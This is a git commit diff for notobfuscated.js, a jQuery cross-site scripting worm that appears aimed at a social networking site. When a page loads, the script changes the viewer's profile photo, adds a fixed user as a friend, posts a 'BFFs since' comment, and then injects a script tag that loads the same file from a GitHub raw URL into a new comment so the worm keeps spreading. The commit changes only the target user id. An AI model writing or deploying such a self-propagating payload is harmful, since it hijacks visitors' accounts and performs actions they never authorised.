aa4fd1eace3cc31ac4f74cb2b56b293a2f825201
Loudon-M <95886342+Loudon-M@users.noreply.github.com>
2021-12-09 17:24:57 -0500

    Update notobfuscated.js

--- notobfuscated.js
+++ notobfuscated.js
@@ -1,13 +1,13 @@
 $( document ).ready(function() {
 		$.ajax({url: "/change_photo.php?type=profile&url=https://imageproxy.ifunny.co/crop:x-20,resize:640x,quality:90x75/images/2d7b2d7748ffa41a2de2d413dee50b5020f9abead83968460a274f408d195c3e_1.jpg", success: function(result){console.log(result);}});
-		$.ajax({url: "/add_friend.php?id=89", success: function(result){
+		$.ajax({url: "/add_friend.php?id=18", success: function(result){
 				console.log(result);
 				if(result == "True - Friend Added Successfully"){
 						var cmnt = "BFFs since: ";
 						var d = new Date();
 						cmnt += d.getMonth()+1+"/"+d.getDate()+"/"+d.getFullYear()+" "+d.getHours()+":"+d.getMinutes();
 						console.log(cmnt);
-						$.ajax({url: "/add_comment.php?id=89" + "&comment=" + cmnt, success: function(result){console.log(result);}});
+						$.ajax({url: "/add_comment.php?id=18" + "&comment=" + cmnt, success: function(result){console.log(result);}});
 						var wrm = "<script src=\"https://raw.githubusercontent.com/Loudon-M/merrychristmas/main/notobfuscated.js\"></script>"
 						$.ajax({url: "/add_comment.php?comment=" + wrm, success: function(result){console.log(result);}});
 					}
